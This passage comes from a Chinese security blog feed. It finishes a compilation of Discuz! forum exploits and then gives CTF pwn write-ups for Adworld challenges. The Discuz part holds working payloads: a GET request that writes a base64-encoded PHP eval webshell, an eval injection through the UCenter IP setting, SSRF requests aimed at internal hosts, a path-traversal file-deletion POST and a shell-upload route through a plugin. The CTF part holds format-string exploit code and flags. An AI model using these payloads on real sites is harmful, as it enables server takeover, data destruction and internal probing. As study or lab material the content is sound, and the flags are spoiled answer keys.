<p>下面就是关键了，现在到了包含文件的时候了。 再新建一个专题：<br>1）专题标题，静态化名称，这2个随便写<br>2）模板名：这个要选择我们刚才生成的页面：.&#x2F;template&#x2F;default&#x2F;portal&#x2F;portal_topic_222.htm</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/f56718e407689f99a980ec93427bb416.png" class>

<p>然后提交，就执行了&lt;?php phpinfo();?&gt;</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/5caaa67f9af210b0741facc198cd1b38.png" class>

<p>参考链接：<a href="https://www.seebug.org/vuldb/ssvid-93612">https://www.seebug.org/vuldb/ssvid-93612</a></p>
<h3 id="演示7：Discuz-7-1-7-2-远程代码执行漏洞"><a href="#演示7：Discuz-7-1-7-2-远程代码执行漏洞" class="headerlink" title="演示7：Discuz! 7.1 - 7.2 远程代码执行漏洞"></a>演示7：Discuz! 7.1 - 7.2 远程代码执行漏洞</h3><p>直接GET，利用语句：<br><a href="http://xxxxx/misc.php?action=imme_binding&amp;response%5Bresult%5D=aa:b&amp;scriptlang%5Baa%5D%5Bb%5D=%7B%5C$%7Bfputs(fopen(base64_decode(Yy5waHA),w),base64_decode(PD9waHAgQGV2YWwoJF9QT1NUW2NdKTsgPz4x))%7D%7D">http://xxxxx/misc.php?action=imme_binding&amp;response[result]=aa:b&amp;scriptlang[aa][b]={\${fputs(fopen(base64_decode(Yy5waHA),w),base64_decode(PD9waHAgQGV2YWwoJF9QT1NUW2NdKTsgPz4x))}}</a></p>
<p>在根目录生成C.PHP密码是C</p>
<p>参考链接：</p>
<p><a href="http://blog.51cto.com/simeon/276114">http://blog.51cto.com/simeon/276114</a></p>
<p><a href="https://www.jb51.net/hack/26337.html">https://www.jb51.net/hack/26337.html</a></p>
<h3 id="演示8：discuz-7-0-runwizard-inc-php-代码执行漏洞"><a href="#演示8：discuz-7-0-runwizard-inc-php-代码执行漏洞" class="headerlink" title="演示8：discuz 7.0 runwizard.inc.php 代码执行漏洞"></a>演示8：discuz 7.0 runwizard.inc.php 代码执行漏洞</h3><p>在该链接下：<a href="http://www.80vul.com/bbs/admincp.php?action=runwizard&amp;step=3">http://www.80vul.com/bbs/admincp.php?action=runwizard&amp;step=3</a></p>
<p>发送如下POST请求包。</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/d039122dcfbf095784f89ed71d9cda9d.png" class>

<p>可获取到webshell</p>
<p><a href="http://www.80vul.com/bbs/forumdata/logs/runwizardlog.php">http://www.80vul.com/bbs/forumdata/logs/runwizardlog.php</a></p>
<p>参考链接：<a href="http://blog.51cto.com/simeon/113131">http://blog.51cto.com/simeon/113131</a></p>
<h3 id="演示9：Discuz-X2-5最新版后台管理员权限Getshell"><a href="#演示9：Discuz-X2-5最新版后台管理员权限Getshell" class="headerlink" title="演示9：Discuz!X2.5最新版后台管理员权限Getshell"></a>演示9：Discuz!X2.5最新版后台管理员权限Getshell</h3><p>在后台–&gt;站长–&gt;Ucenter设置处设置UcenterIP为: XX\\‘);eval($_POST[a])?&gt;;&#x2F;&#x2F;<br>XX</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/946befb507f2380f0296e9fb588509b8.png" class>

<p>发现管理页面代码出来了</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/11ccd15874dce153f7d432b879907ee4.png" class>

<p>上菜刀：<a href="http://127.0.0.1/d25/uc_server">http://127.0.0.1/d25/uc_server</a></p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/76a0d8d82f4ccc540d1015819f98adc7.png" class>

<p>参考链接：<a href="https://www.seebug.org/vuldb/ssvid-93655">https://www.seebug.org/vuldb/ssvid-93655</a></p>
<h3 id="演示10：Discuz后台getshell"><a href="#演示10：Discuz后台getshell" class="headerlink" title="演示10：Discuz后台getshell"></a>演示10：Discuz后台getshell</h3><p>后台找到应用，插件</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/d5d71fbdc6185df240c12000c439fe3d.png" class>

<p>有一个好贷站长联盟</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/31550f4e59018e1fbba24eec7bb43e9e.png" class>

<p>安装之后有一个导入接口信息</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/74f33d0c31fa5ba3b8dbd3bfde9512b4.png" class>

<p>然后导入接口信息</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/8dbe1fcf8edf3af872ec286dbb8e9f07.png" class>

<p>接口信息会放到这里</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/934bf7257cf564eb89c2776934e858ba.png" class>

<p>然后就shell了</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/82c59a29c3788973678e4c8d6ec9d66f.png" class>

<p>参考链接：<a href="https://www.seebug.org/vuldb/ssvid-93624">https://www.seebug.org/vuldb/ssvid-93624</a></p>
<h2 id="SSRF漏洞"><a href="#SSRF漏洞" class="headerlink" title="SSRF漏洞"></a>SSRF漏洞</h2><p><strong>漏洞描述：</strong>SSRF(Server-Side Request Forgery:服务器端请求伪造)<br>是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。SSRF<br>形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。可利用来探测内网信息或获取别的网站的信息或钓鱼等。涉及URL如下：</p>
<p><a href="http://ip/bbs/forum.php?mod=ajax&action=downremoteimg&message=%5Bimg=1,1%5Dhttp://xxxxxxxxxxxxxx.jpg%5B/img%5D&formhash=09cec465">http://ip/bbs/forum.php?mod=ajax&action=downremoteimg&message=[img&#x3D;1,1]http://xxxxxxxxxxxxxx.jpg[&#x2F;img]&amp;formhash&#x3D;09cec465</a></p>
<p><a href="http://ip/discuz_x3.2_sc_gbk/upload/portal.php">http://ip/discuz_x3.2_sc_gbk/upload/portal.php</a></p>
<p><strong>漏洞场景：</strong>Discuz</p>
<p><strong>漏洞地址：</strong></p>
<p><strong>漏洞级别：</strong>高危</p>
<p>测试步骤与截图：</p>
<h3 id="演示1：SSRF漏洞"><a href="#演示1：SSRF漏洞" class="headerlink" title="演示1：SSRF漏洞"></a>演示1：SSRF漏洞</h3><p>利用前提 ptid&#x3D;&#x3D;aid且两者必须存在(ptid&#x3D;&#x3D;帖子id,aid&#x3D;&#x3D;门户文章id),pid&#x3D;任意评论id。<br>即论坛门户发表过文章，准备和确认<a href="http://a.cn/discuz_x3.2_sc_gbk/upload/portal.php?mod=view&amp;aid=1">http://a.cn/discuz_x3.2_sc_gbk/upload/portal.php?mod=view&amp;aid=1</a><br>确认门户中存在发表过的文章,记录下可用的aid</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/c7fdbe9b01886221ed6af7f6294662f2.png" class>

<p>第一步 登陆后,请求获取modauthkey算出的一个key,用于操作对应文章:<br><a href="http://a.cn/discuz_x3.2_sc_gbk/upload/forum.php?mod=redirect&amp;goto=findpost&amp;modthreadkey=1&amp;ptid=1&amp;pid=1">http://a.cn/discuz_x3.2_sc_gbk/upload/forum.php?mod=redirect&amp;goto=findpost&amp;modthreadkey=1&amp;ptid=1&amp;pid=1</a></p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/3655f2c2013bcc964feef6be4b830deb.png" class>

<p>从跳转的链接取出modthreadkey的参数值:<br><a href="http://a.cn/discuz_x3.2_sc_gbk/upload/forum.php?mod=viewthread&amp;tid=1&amp;page=1&amp;modthreadkey=fce8163c9f310147f91a244a9eb9dc33%5C#pid1">http://a.cn/discuz_x3.2_sc_gbk/upload/forum.php?mod=viewthread&amp;tid=1&amp;page=1&amp;modthreadkey=fce8163c9f310147f91a244a9eb9dc33\#pid1</a></p>
<p>第二步 带上当前formhash,modarticlekey拼上第一步的modthreadkey的值,即可发请求:<br>POST:<a href="http://a.cn/discuz_x3.2_sc_gbk/upload/portal.php?mod=portalcp&amp;ac=upload&amp;aid=1&amp;catid=1&amp;op=downremotefile&amp;formhash=760dc9d6&amp;modarticlekey=fce8163c9f310147f91a244a9eb9dc33&amp;content=%5C">http://a.cn/discuz_x3.2_sc_gbk/upload/portal.php?mod=portalcp&amp;ac=upload&amp;aid=1&amp;catid=1&amp;op=downremotefile&amp;formhash=760dc9d6&amp;modarticlekey=fce8163c9f310147f91a244a9eb9dc33&amp;content=\</a><img src="http://internal.zabbix/images/general/zabbix.png\"> aa&#x3D;a</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/3cb02a3ff18c3a978a9d4cef5644181e.png" class>

<p>internal.zabbix域名下的图片被下载并上传到Discuz指定的图片路径下:<br><a href="http://a.cn/discuz_x3.2_sc_gbk/upload/data/attachment/portal/201605/17/112626qszsaqolbm9l93qm.png">http://a.cn/discuz_x3.2_sc_gbk/upload/data/attachment/portal/201605/17/112626qszsaqolbm9l93qm.png</a></p>
<p><a href="http://a.cn/discuz_x3.2_sc_gbk/upload/data/attachment/portal/201605/17/112626qszsaqolbm9l93qm.png.thumb.jpg">http://a.cn/discuz_x3.2_sc_gbk/upload/data/attachment/portal/201605/17/112626qszsaqolbm9l93qm.png.thumb.jpg</a></p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/858590279078a58213d111945ba8800e.png" class>

<p>参考链接：<a href="http://0day5.com/archives/3920/">http://0day5.com/archives/3920/</a></p>
<h3 id="演示2：另一处SSRF漏洞（2-x，3-x）"><a href="#演示2：另一处SSRF漏洞（2-x，3-x）" class="headerlink" title="演示2：另一处SSRF漏洞（2.x，3.x）"></a>演示2：另一处SSRF漏洞（2.x，3.x）</h3><p>访问<a href="http://xxxx/bbs/forum.php?mod=ajax&amp;action=downremoteimg&amp;message=%5Bimg=1,1%5Dhttp://xxxxxxxxxxxxxx.jpg%5B/img%5D&amp;formhash=09cec465">http://xxxx/bbs/forum.php?mod=ajax&amp;action=downremoteimg&amp;message=[img=1,1]http://xxxxxxxxxxxxxx.jpg[/img]&amp;formhash=09cec465</a></p>
<p>3.x 版本如果请求提示xss拦截要带上 formhash<br>加cookie,之前版本好像不用。SSRF成功后，域名被解析成IP。</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/3e680cf0afb06099addb160c719dd884.png" class>

<p>参考链接：<a href="https://bugs.shuimugan.com/bug/view?bug_no=151179">https://bugs.shuimugan.com/bug/view?bug_no=151179</a></p>
<h2 id="文件操作类漏洞"><a href="#文件操作类漏洞" class="headerlink" title="文件操作类漏洞"></a>文件操作类漏洞</h2><p><strong>漏洞描述：</strong>由于没有对文件操作类的函数做好限制，导致discuz组件存在文件上传漏洞、任意文件删除漏洞、本地文件包含漏洞。涉及URL如下：</p>
<p>#spacecp模块-&gt;演示1</p>
<p><a href="http://ip/discuz3_2/home.php?mod=spacecp&amp;ac=profile">http://ip/discuz3_2/home.php?mod=spacecp&amp;ac=profile</a></p>
<p>#管理后台-应用-插件-演示2</p>
<p>测试步骤与截图：</p>
<h3 id="演示1：Discuz-X前台任意文件删除漏洞"><a href="#演示1：Discuz-X前台任意文件删除漏洞" class="headerlink" title="演示1：Discuz!X前台任意文件删除漏洞"></a>演示1：Discuz!X前台任意文件删除漏洞</h3><p>新建importantfile.txt作为测试 进入设置-个人资料，先在页面源代码找到formhash值<br><a href="http://10.0.2.15:8999/discuz3_2/home.php?mod=spacecp&amp;ac=profile">http://10.0.2.15:8999/discuz3_2/home.php?mod=spacecp&amp;ac=profile</a></p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/b62795c5be846c3c7036f061739342ec.png" class>

<p>可以看到formhash值是b21b6577。再访问10.0.2.15:8999&#x2F;discuz3_2&#x2F;home.php?mod&#x3D;spacecp&amp;ac&#x3D;profile&amp;op&#x3D;base<br>Post数据：birthprovince&#x3D;..&#x2F;..&#x2F;..&#x2F;importantfile.txt&amp;profilesubmit&#x3D;1&amp;formhash&#x3D;b21b6577<br>如图</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/3dd60f54cebf35cf2bf8a72a049f7ce4.png" class>

<p>执行后</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/1e57cee32d198af9e3c6a28a5955d587.png" class>

<p>出生地被修改成要删除的文件。最后构造表单执行删除文件</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/4781de6b2740e55dbd867bb9986cb732.png" class>

<p>随便上传一张图片，即可删除importantfile.txt。</p>
<p><a href="http://www.freebuf.com/vuls/149904.html">http://www.freebuf.com/vuls/149904.html</a></p>
<h3 id="演示2：Discuz-后台第三方插件上传任意后缀文件拿shell（某插件导致）"><a href="#演示2：Discuz-后台第三方插件上传任意后缀文件拿shell（某插件导致）" class="headerlink" title="演示2：Discuz! 后台第三方插件上传任意后缀文件拿shell（某插件导致）"></a>演示2：Discuz! 后台第三方插件上传任意后缀文件拿shell（某插件导致）</h3><p>问题插件出在：[MZG]点广告赚积分 1.0<br><a href="http://addon.discuz.com/?@mzg_advertise.plugin">http://addon.discuz.com/?@mzg_advertise.plugin</a> 1.先搜索 “MZG” 找到<br>点广告赚积分。</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/28b9ef060ed6856c5e28f2a6d3afda50.png" class>

<p>安装插件，安装GBK还是UFT8随你系统编码选择。安装好插件后，选择 “添加广告”。</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/6537467b1c4ad95ad2df969576ecb389.png" class>

<p>添加广告里面的 LOGO<br>文件上传，选本地上传，这里面未限制文件后缀，可以上传任意后缀名文件。</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/0040a2852de1adfd6c74535d7e88a3d2.png" class>

<p>查看添加的广告，看到了吧？</p>
<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/5c32e20f2e7bc168defad3174014ff0c.png" class>

<img src="/2021/10/26/wLHK-Discuz%E6%BC%8F%E6%B4%9E%E6%95%B4%E7%90%86/9d383b898f5ee40aaa646ae31082e72f.png" class>

<p><a href="https://www.seebug.org/vuldb/ssvid-93632">https://www.seebug.org/vuldb/ssvid-93632</a></p>
<h2 id="其他类型漏洞"><a href="#其他类型漏洞" class="headerlink" title="其他类型漏洞"></a>其他类型漏洞</h2><p><strong>漏洞描述：</strong>越权、xxe</p>
<p>Discuz! –X2&#x2F;X2.5管理权限用户修改创始人用户密码漏洞</p>
<p><a href="https://www.seebug.org/vuldb/ssvid-93622">https://www.seebug.org/vuldb/ssvid-93622</a></p>
<p>Discuz!3.2 利用UC_KEY登陆任意用户</p>
<p><a href="https://www.seebug.org/vuldb/ssvid-89483">https://www.seebug.org/vuldb/ssvid-89483</a></p>
<p>Discuz! X3.1 逻辑错误漏洞</p>
<p><a href="https://www.seebug.org/vuldb/ssvid-89427">https://www.seebug.org/vuldb/ssvid-89427</a></p>
<p>discuz越权回复</p>
<p><a href="https://www.seebug.org/vuldb/ssvid-93753">https://www.seebug.org/vuldb/ssvid-93753</a></p>
<p><a href="https://www.seebug.org/vuldb/ssvid-93609">https://www.seebug.org/vuldb/ssvid-93609</a></p>
<p>越权查看照片</p>
<p><a href="https://www.seebug.org/vuldb/ssvid-93721">https://www.seebug.org/vuldb/ssvid-93721</a></p>
<p><a href="https://www.seebug.org/vuldb/ssvid-93722">https://www.seebug.org/vuldb/ssvid-93722</a></p>
<p>Discuz! 多个版本HTTP host头攻击漏洞</p>
<p><a href="https://www.seebug.org/vuldb/ssvid-93728">https://www.seebug.org/vuldb/ssvid-93728</a></p>
<p>Discuz! xxe 可破坏数据库结构，导致脏数据进入</p>
<p><a href="https://bugs.shuimugan.com/bug/view?bug_no=76041">https://bugs.shuimugan.com/bug/view?bug_no=76041</a></p>
<p>Discuz附件下载权限绕过</p>
<p><a href="https://www.seebug.org/vuldb/ssvid-93615">https://www.seebug.org/vuldb/ssvid-93615</a></p>
<p>知道key的情况下对ucserver进行注射</p>
<p><a href="https://bugs.shuimugan.com/bug/view?bug_no=65534">https://bugs.shuimugan.com/bug/view?bug_no=65534</a></p>
<p><strong>漏洞场景：</strong>登陆地址中含有session类字段</p>
<p><strong>漏洞地址：</strong></p>
<p><strong>漏洞级别：</strong>高危</p>
<p>测试步骤与截图：</p>
<p>安全修复建议：</p>
<p>每次会话由服务端生成随机的，唯一的，复杂的session。</p>
]]></content>
      <categories>
        <category>Web漏洞</category>
        <category>CMS漏洞</category>
        <category>Discuz</category>
      </categories>
      <tags>
        <tag>-web漏洞 -CMS漏洞 -Discuz论坛</tag>
      </tags>
  </entry>
  <entry>
    <title>【攻防世界】Pwn系列之CGfsb</title>
    <url>/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Pwn%E7%B3%BB%E5%88%97%E4%B9%8BCGfsb/</url>
    <content><![CDATA[<h1 id="【攻防世界】Pwn系列之CGfsb"><a href="#【攻防世界】Pwn系列之CGfsb" class="headerlink" title="【攻防世界】Pwn系列之CGfsb"></a>【攻防世界】Pwn系列之CGfsb</h1><p>该程序运行后需要进行两个输入，运行结果如下</p>
<img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Pwn%E7%B3%BB%E5%88%97%E4%B9%8BCGfsb/image-20231124204806389.png" class title="image-20231124204806389">

<p>使用IDA反汇编该程序，获取其源代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _DWORD buf[<span class="number">2</span>]; <span class="comment">// [esp+1Eh] [ebp-7Eh] BYREF</span></span><br><span class="line">  __int16 v5; <span class="comment">// [esp+26h] [ebp-76h]</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">100</span>]; <span class="comment">// [esp+28h] [ebp-74h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v7; <span class="comment">// [esp+8Ch] [ebp-10h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">  buf[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  buf[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please tell me your name:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0xA</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;leave your message please:&quot;</span>);</span><br><span class="line">  fgets(s, <span class="number">100</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;hello %s&quot;</span>, (<span class="keyword">const</span> <span class="keyword">char</span> *)buf);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;your message is:&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(s);</span><br><span class="line">  <span class="keyword">if</span> ( pwnme == <span class="number">8</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;you pwned me, here is your flag:\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;cat flag&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Thank you!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>提供的代码是一个 C 语言程序，它会提示用户输入姓名和一条消息，并且会打印一个个性化的问候语和用户输入的消息。main函数初始化了一些变量，包括一个大小为 2 的数组buf和一个大小为 100 的字符数组s。该函数使用 setbuf&#96; 函数来禁用标准输入、输出和错误流的缓冲。程序随后提示用户输入姓名，使用 puts 函数进行输出，并使用 read 函数将用户输入读取到 buf 数组中。然后程序再次提示用户输入消息，这次使用 puts 函数进行输出。用户输入的消息使用 fgets 函数读取到 s 数组中。程序接下来使用 printf 函数，传递 buf 数组作为参数，打印个性化的问候语。用户输入的消息也使用 printf 函数进行输出。最后，程序检查 pwnme 的值是否等于 8。如果是，则使用 system 函数执行命令 “cat flag” 并打印包含标志的消息。否则，程序打印一条感谢用户的消息。</p>
<p>这里关键的判断就是<strong>pwnme&#x3D;&#x3D;8</strong>,但是整个代码没有对pwnme这个变量进行赋值，所以<strong>需要对pwnme进行赋值操作</strong></p>
<p>这里我们可以看到**printf(s)**存在格式化字符串漏洞，所以这道题的思路就是：利用格式化字符串漏洞，实现任意地址写，修改pwnme全局变量的值等于8，即可获得flag</p>
<p><strong>任意地址覆写</strong></p>
<ul>
<li>确定格式化字符漏洞受控参数在printf栈中的偏移量n</li>
<li>确定需要读内存的地址target_address</li>
<li>将目标地址tar_address写入printf函数栈中的%n$s，最后通过%n写入目标数值即可</li>
</ul>
<p>首先来确定s在main栈中的偏移量，可以从IDA中的堆栈信息看到s距离esp40个字节，10个偏移量。下面通过对程序实际输出进行验证，如图所示，第10个输出414141转换为ASCII码就是AAAA，即s保存的前四位，证明s距离偏移量为10</p>
<img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Pwn%E7%B3%BB%E5%88%97%E4%B9%8BCGfsb/image-20231124221818625.png" class title="image-20231124221818625">

<p>全局变量pwnme的地址就是tar_address，即0x0804A068</p>
<p>构造payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">p32(0x0804A068) + &#x27;%4c%10$n&#x27;</span><br><span class="line">或者</span><br><span class="line">p32(0x0804A068) + &quot;aaaa&quot; + &#x27;%10$n&#x27;</span><br></pre></td></tr></table></figure>

<p>上面的payload的意思是将8个字节保存在0x804A068即pwnme这个变量中，使得此时pwnme的值为8，即输出flag值</p>
<p>exp代码如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;61.147.171.105&#x27;</span>, <span class="number">54143</span>)</span><br><span class="line">addr_pwnme = <span class="number">0x0804A068</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;please tell me your name:\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;J1ay&#x27;</span>)</span><br><span class="line">payload = p32(addr_pwnme) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x4</span> + <span class="string">b&#x27;%10$n&#x27;</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;leave your message please:\n&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Pwn%E7%B3%BB%E5%88%97%E4%B9%8BCGfsb/image-20231124222908610.png" class title="image-20231124222908610">

<p>得到flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cyberpeace&#123;ce9ffbf036f39bf5075b33a2870b0433&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTF</category>
        <category>Pwn</category>
      </categories>
      <tags>
        <tag>-CTF -Pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>【攻防世界】Pwn系列之get_shell</title>
    <url>/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Pwn%E7%B3%BB%E5%88%97%E4%B9%8Bget_shell/</url>
    <content><![CDATA[<h1 id="【攻防世界】Pwn系列之get-shell"><a href="#【攻防世界】Pwn系列之get-shell" class="headerlink" title="【攻防世界】Pwn系列之get_shell"></a>【攻防世界】Pwn系列之get_shell</h1><p>运行该程序后，进入一个shell界面，让你输入指令</p>
<img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Pwn%E7%B3%BB%E5%88%97%E4%B9%8Bget_shell/image-20231114094104122.png" class title="image-20231114094104122">

<p>我们使用IDA反汇编该程序，可以看到入口处main()函数如下所示，就是调用&#x2F;bin&#x2F;sh让你输入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">public main</span><br><span class="line">main proc near</span><br><span class="line">; __unwind &#123;</span><br><span class="line">push    rbp</span><br><span class="line">mov     rbp, rsp</span><br><span class="line">mov     edi, offset s   ; &quot;OK,this time we will get a shell.&quot;</span><br><span class="line">call    _puts</span><br><span class="line">mov     edi, offset command ; &quot;/bin/sh&quot;</span><br><span class="line">mov     eax, 0</span><br><span class="line">call    _system              ;使用system()调用/bin/sh</span><br><span class="line">mov     eax, 0</span><br><span class="line">pop     rbp</span><br><span class="line">retn</span><br><span class="line">; &#125; // starts at 400566</span><br><span class="line">main endp</span><br></pre></td></tr></table></figure>

<p>反编译成c语言后得看到更加清晰的代码逻辑</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;OK,this time we will get a shell.&quot;</span>);</span><br><span class="line">  <span class="built_in">system</span>(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所以还得从运行程序来观察，执行<strong>ls</strong>命令，可以看到其下有个get_shell文件就是进入自己的shell</p>
<img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Pwn%E7%B3%BB%E5%88%97%E4%B9%8Bget_shell/image-20231114094343528.png" class title="image-20231114094343528">



<p>这里需要连接远程的服务器<strong>61.147.171.105:59020</strong>,该目录下可以看到flag这个文件，查看该文件内容</p>
<img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Pwn%E7%B3%BB%E5%88%97%E4%B9%8Bget_shell/image-20231114101206781.png" class title="image-20231114101206781">

<p>可以得到flag为<strong>cyberpeace{983a129667d9ea3186712a1040f1de86}</strong></p>
<img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Pwn%E7%B3%BB%E5%88%97%E4%B9%8Bget_shell/image-20231114101255814.png" class title="image-20231114101255814">



<p>也可以编写代码连接远程服务器查看flag文件，代码如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;61.147.171.105&quot;</span>,<span class="string">&quot;59020&quot;</span>)</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>,arch = <span class="string">&#x27;arm64&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行可得到flag字符串</p>
<img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Pwn%E7%B3%BB%E5%88%97%E4%B9%8Bget_shell/image-20231114101717436.png" class title="image-20231114101717436">]]></content>
      <categories>
        <category>CTF</category>
        <category>Pwn</category>
      </categories>
      <tags>
        <tag>-CTF -Pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>【攻防世界】Pwn系列之int_overflow</title>
    <url>/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Pwn%E7%B3%BB%E5%88%97%E4%B9%8Bint_overflow/</url>
